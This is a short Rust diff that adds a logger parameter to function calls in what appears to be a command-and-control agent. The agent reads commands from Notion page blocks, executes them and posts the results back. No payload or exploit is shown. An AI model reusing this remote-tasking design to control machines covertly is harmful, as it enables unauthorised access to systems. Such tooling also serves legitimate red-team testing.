@@ -110,7 +110,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .default_headers(headers)
         .build()?;
 
-    let page_id = create_page(&client, &config_options, hn)
+    let page_id = create_page(&client, &config_options, hn, &logger)
         .await
         .unwrap();
     
@@ -138,8 +138,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                         let output = notion_command.handle(&mut config_options, &logger).await?;
                         let command_block_id = block["id"].as_str().unwrap();
-                        complete_command(&client, block.to_owned()).await;
-                        send_result(&client, command_block_id, output).await;
+                        complete_command(&client, block.to_owned(), &logger).await;
+                        send_result(&client, command_block_id, output, &logger).await;
                         // Check for any final work based on command type,
                         // Like shutting down the agent
                         match notion_command.command_type {
